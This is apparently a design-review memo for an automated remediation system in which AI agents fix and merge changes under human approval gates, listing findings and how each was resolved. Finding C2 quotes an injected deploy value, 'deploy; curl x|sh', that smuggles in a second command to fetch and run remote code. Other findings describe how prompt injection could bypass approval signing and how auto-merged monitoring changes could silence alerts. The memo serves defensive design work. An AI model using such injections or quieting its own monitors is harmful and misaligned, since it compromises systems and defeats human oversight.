# Review of DESIGN v1 — findings and dispositions

Four independent reviews of `DESIGN.md` v1, 2026-09-09: a fact-check against the
live database and code, an adversarial architecture pass (Opus, with its own
sub-agents into sideclaw), an implementability pass, and one out-of-family model
(`gpt-6-astra`, `reasoning.mode=pro`) reading the doc cold.

Two findings were reached independently by two reviewers — the quiet rule and the
shell-injectable deploy contract. Those are the two I would have shipped.

## Critical — accepted, design changed

| # | Finding | Disposition |
|-|-|-|
| C1 | `POST /decide` behind a bearer token destroys the gate. The signing key lives only in gateway RAM and **only a Slack interaction payload can cause a signature to exist** — "prompt injection produces words, and words cannot mint a signature." A bearer token is words, and an episode can hold one. Also: `payload_hash` binds to bytes; `decide(item_id, …)` binds to mutable state — a strict downgrade. | Split intent from signature. The API records intents and never signs. Signing stays behind Slack Socket Mode or a TTY-gated CLI. `payload_hash` kept. |
| C2 | `deploy-targets.json` interpolated into `ssh <host> "cd <dir> && make <target> <env>"` is a shell, breaking principle 4 on the same page that states it. `"deploy; curl x\|sh"` is a second command. | Reverted to the closed `case`. JSON names a key, code owns the whole argv. |
| C3 | Auto-merged monitoring config is self-concealing: raise a threshold, verify the threshold is live, mark `fixed` — and the alert never fires again, scored as a verified unattended fix. Goodhart with a deploy bit. No rollback anywhere in v1. | Fourth human-essential case (changes to self-observation, never promotable). `fixed` for monitoring config requires a synthetic trip. Deploy-target definitions excluded from every `autoMergePaths`. `warden revert` added. |
| C4 | The ledger: no WAL, no `busy_timeout`, six writers, **two independent schema migrators with no version table**, no backup, and an HTTP server for a polling dashboard added on top. | WAL + busy_timeout, one writer, read-only API, one migrator + `schema_version`, `VACUUM INTO` backup on heartbeat. |
| C5 | sideclaw's `POST /api/jobs` has **no auth and no repo allowlist**; `resolve_repo()` in `hermes-cc.sh` is the entire scope control, and v1 moved it to warden — leaving the executor with zero policy. | The allowlist and tier ceiling are re-asserted **inside sideclaw**, in Wave 0. Warden's copy is defence in depth. |
| C6 | The quiet rule reproduces the original bug: an item in `needs_human` with a written fix goes terminal `quiet` when the fault clears on its own. Already live — grouped items in `needs_human` quiet-resolve at 2h, 90 min before the doc's own 4h SLA. | Observation status and remediation obligation separated as principle 5. Silence-resolve applies only to `new`. |

## Major — accepted

- **States with no exit.** `merge_blocked`, `merged`, `needs_human` were leaves
  that were not terminal. `poll_implement_jobs`/`poll_validation_jobs` have no
  deadline and no attempt counter, and sideclaw prunes jobs at 24h **or** 200
  rows — a cap shared with interactive `/check` — so a pruned job strands an item
  forever. → `state_deadline` and a named poller on every non-terminal state.
- **`hermes-cc.sh` is four things**, only two of which belong in warden. The
  verdict schema physically lives in sideclaw; copying it guarantees drift, and
  drift presents as "verdict silently ignored" — the exact target failure. →
  one thin contract, schema published as a versioned artifact.
- **Verdicts are prose, not typed.** Seven handler outcomes are
  string-concatenated into one field; a sensitive-withheld verdict is typeless and
  indistinguishable from a genuine needs-human. → typed `outcome` enum in
  sideclaw, Wave 0.
- **No abort, no per-repo lock.** `cancel` marks a row abandoned while the episode
  keeps running; the real kill switch is `make herdr-restart`. Two implement
  episodes on one repo open two unaware PRs. → both added.
- **No crash-recovery protocol.** SQLite cannot atomically change a row *and*
  merge a PR. → operation id before dispatch, remote receipts, `unknown` as an
  explicit reconciled outcome.
- **Approve-rate is not a promotion signal.** It measures the sample, not the
  policy; fatigue causes a 100% approve rate as often as good scoping does, and
  it is blindest exactly where C3 bites. → promotion needs a clean outcome record
  too and stays manual; demotion is automatic on one revert or reopen.
- **No budgets in v1 at all.** At tier 3 with no daily merge cap, forty correlated
  alerts are forty merges. → existing ceilings stated and preserved.

## Facts corrected

| v1 claim | Actual |
|-|-|
| 0 liveness-verified fixes | **2** — items 931/932 via `resolve_recovery_paired()` after `vps#8` merged |
| 15 investigate episodes in 14 days | 15 all-time over 38 days; **11** in the window |
| 26 closes on silence | **23** |
| image-share deploys via Actions → RollHook | **No CI at all**; belongs in the deploy-key group |
| `uk:229` is the item about the crash-loop | Unsupported — opened 5h20m later, different root cause |

Confirmed exactly: the 7-restarts-in-3m34s crash-loop, the in-gateway-cron split,
the one-arm `deploy_argv()`, Slack-only approval orchestration, $82/14d real spend,
dispatch on Max, and all three unmapped monitors. Separately noted:
`dispatches.merged_at` for the one successful implement is **NULL** — the ledger
failed to record its own merge.

## Rejected

- **Defer the whole Argo console** (out-of-family review). Rejected as a cut, but
  its *ordering* is accepted: Argo moves behind crash-reconciliation, because a
  console rendering a funnel nothing flows through is decoration. The operator's
  stated need for visibility is real and Argo remains the surface that survives a
  mini outage.
- **Cut verification to ship faster.** Not proposed by any reviewer and named here
  because it will be tempting: verification is the only thing separating `fixed`
  from `quiet`, which is the entire point.

## Accepted with the operator's framing preserved

The out-of-family review recommended cutting new origins and generic SSH deploy
from the first release. Accepted — but as sequencing, not scope reduction. The
stated goal is maximum automation with human-in-the-loop only where essential;
that goal is served by proving one complete path survives a kill at every
boundary before multiplying origins, not by shipping breadth over a hole.
